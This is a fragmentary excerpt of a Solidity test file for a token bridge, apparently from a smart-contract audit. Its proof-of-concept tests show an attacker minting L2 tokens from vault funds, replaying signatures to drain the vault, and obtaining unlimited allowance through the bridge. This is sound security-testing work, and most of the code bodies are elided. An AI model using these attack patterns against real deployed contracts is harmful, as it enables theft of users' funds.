...
contract L1BossBridgeTest is Test {
    ...
    function testCanTransferFromVaultToVaultToMintL2Tokens() public {
        address attacker = makeAddr("attacker");
        uint256 vaultBalance = 500 ether;

        // deal cheatcode gives a address or contract desired erc20 balance
    ...
    function testSignatureReplay() public {
        // asssume the vault already holds some tokens

        address attacker = makeAddr("attacker");
        uint256 vaultInitialBalance = 500 ether;
        uint256 attackerInitialBalance = 500 ether;
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), attacker, attackerInitialBalance);

        // an attacker deposit token to L2
        ...
        assert(token.balanceOf(address(attacker)) == attackerInitialBalance + vaultInitialBalance);
    ...
    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
        ...
        assert(token.allowance(address(vault), attacker) == type(uint256).max);
